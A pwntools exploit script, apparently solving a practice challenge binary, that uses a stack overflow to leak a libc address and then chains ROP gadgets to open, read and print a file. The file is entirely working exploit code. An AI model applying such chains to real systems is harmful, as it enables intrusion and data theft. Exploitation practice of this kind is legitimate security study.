#!/usr/bin/env python3
from pwn import *
import os


# p = process('/challenges/06-chain/target', stderr=2)
p = process(['/challenges/06-chain/target'],stderr=2, cwd=os.getcwd())
e = ELF('/challenges/06-chain/target')
# libc = ELF(p.libc.path)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print("Libc path: ", libc)
offset = 100
buffer_addr = e.bss(offset)
print("bss addr: ", hex(buffer_addr)) # 0x000000000404060

p.readline()
pop_rdi = 0x0000000000401403         # pop rdi; ret
ret = 0x0000000000401016             # ret; 
pop_rsi_pop_r15 = 0x0000000000401401 # pop rsi; pop r15; ret
pop_rdx_pop_r12 = 0x000000000011f2e7 # pop rdx; pop r12; ret (libc)

vuln_addr = 0x000000000040130d
payload = b'A' * 0x70
payload += b'B' * 8
payload += p64(pop_rdi)
payload += p64(e.got['__libc_start_main'])
payload += p64(e.symbols['puts'])
payload += p64(vuln_addr) ## give me something...

print(payload)
p.send(payload)
libc_start_main_str = p.readline()
print(libc_start_main_str)
libc_start_main = u64(libc_start_main_str.strip().ljust(8, b'\x00'))
print(hex(libc_start_main))

libc_base = libc_start_main - libc.symbols['__libc_start_main']
print("LIBC_BASE: 0x%x" % libc_base)

# libc.address = libc_base
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
system_addr = libc_base + libc.symbols['system']
pop_rdx_pop_r12 += libc_base
symbolic_link_addr = next(e.search(b'a\x00'))
print("symbolink addr: ", hex(symbolic_link_addr))

print("Leaked libc_start_main address:", hex(libc_start_main))
print("Libc base address:", hex(libc_base))
print("System address:", hex(system_addr))
print("'/bin/sh' address:", hex(bin_sh_addr))

p.readline()

# payload_2nd = b'A' * 0x70
# payload_2nd += b'B' * 8
# payload_2nd += p64(pop_rdi)
# payload_2nd += p64(0)
# payload_2nd += p64(ret)
# payload_2nd += p64(pop_rsi_pop_r15)       
# payload_2nd += p64(buffer_addr)
# payload_2nd += p64(0)
# payload_2nd += p64(pop_rdx_pop_r12)       
# payload_2nd += p64(8)
# payload_2nd += p64(0)            
# payload_2nd += p64(e.symbols['read'])
# payload_2nd += p64(vuln_addr)

payload_2nd = b'A' * 0x70
payload_2nd += b'B' * 8
payload_2nd += p64(pop_rdi)
payload_2nd += p64(symbolic_link_addr)
payload_2nd += p64(pop_rsi_pop_r15) 
payload_2nd += p64(0)
payload_2nd += p64(0)
payload_2nd += p64(libc_base+libc.symbols['open'])
payload_2nd += p64(vuln_addr)


with open("payload_2nd.bin", "wb") as f:
    f.write(payload_2nd)

pause()
p.send(payload_2nd)

p.readline()
payload_3rd = b'A' * 0x70
payload_3rd += b'B' * 8
payload_3rd += p64(pop_rdi)
payload_3rd += p64(3)             # rdi = 파일 디스크립터
# payload_3rd += p64(ret)
payload_3rd += p64(pop_rsi_pop_r15)
payload_3rd += p64(buffer_addr) # rsi = .bss
payload_3rd += p64(0)   # r15 = 0
payload_3rd += p64(pop_rdx_pop_r12)
payload_3rd += p64(0x50) # rdx = 0x50
payload_3rd += p64(0)      
payload_3rd += p64(libc_base+libc.symbols['read'])            # read 호출
payload_3rd += p64(vuln_addr)

with open("payload_3rd.bin", "wb") as f:
    f.write(payload_3rd)

pause()
p.send(payload_3rd)

# 이후 write(1, .bss, 0x50) 호출
payload_4th = b'A' * 0x70
payload_4th += b'B' * 8
payload_4th += p64(pop_rdi)
payload_4th += p64(1)             # rdi = stdout
payload_4th += p64(pop_rsi_pop_r15)
payload_4th += p64(buffer_addr) # rsi = .bss
payload_4th += p64(0)  
payload_4th += p64(pop_rdx_pop_r12)
payload_4th += p64(0x50) # rdx = 0x50
payload_4th += p64(0)      
payload_4th += p64(libc_base+libc.symbols['write'])           # write 호출
payload_4th += p64(vuln_addr)

p.send(payload_4th)


p.interactive()